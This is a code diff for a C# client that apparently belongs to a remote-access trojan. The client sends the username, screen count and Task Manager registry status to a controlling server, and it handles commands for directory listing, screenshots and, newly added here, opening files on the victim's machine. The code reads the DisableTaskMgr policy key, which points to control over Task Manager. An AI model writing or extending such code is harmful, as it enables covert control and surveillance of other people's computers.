@@ -9,18 +9,18 @@ namespace Client.Client
         private const string szTaskMgrRegPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
         public static bool SendName()
         {
-            return Main.socketClient.SendASCII("<GET-NAME>" + WindowsHelper.GetUsername());
+            return Main.socketClient.SendUTF8("<GET-NAME>" + WindowsHelper.GetUsername());
         }
 
         public static void SendScreenCount()
         {
-            Main.socketClient.SendASCII("<GET-SCREENCOUNT>" + WindowsHelper.GetScreenCount().ToString());
+            Main.socketClient.SendUTF8("<GET-SCREENCOUNT>" + WindowsHelper.GetScreenCount().ToString());
         }
 
         public static void SendTaskmgrStatus()
         {
             string value = WindowsHelper.ReadRegistryKey(szTaskMgrRegPath, "DisableTaskMgr");
-            Main.socketClient.SendASCII("<GET-TASKMGR-REG>" + value);
+            Main.socketClient.SendUTF8("<GET-TASKMGR-REG>" + value);
         }
 
         public static void ParseData(string data)
@@ -35,7 +35,7 @@ namespace Client.Client
 
             if (szCMD.StartsWith("<PING>"))
             {
-                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes(szCMD));
+                Main.socketClient.GetServerSocket().Send(Encoding.UTF8.GetBytes(szCMD));
             }
             
             if (szCMD.StartsWith("<SET-TASKMGR>"))
@@ -61,6 +61,12 @@ namespace Client.Client
             {
                 szCMD = szCMD.Replace("<REQUEST-DIRS>", "");
                 FileManager.LoadDirectories(szCMD);
+            }
+
+            if(szCMD.StartsWith("<REQUEST-OPENFILE>"))
+            {
+                szCMD = szCMD.Replace("<REQUEST-OPENFILE>", "");
+                FileManager.OpenFile(szCMD);
             }
 
             if(szCMD.StartsWith("<PRINTSCREEN>"))
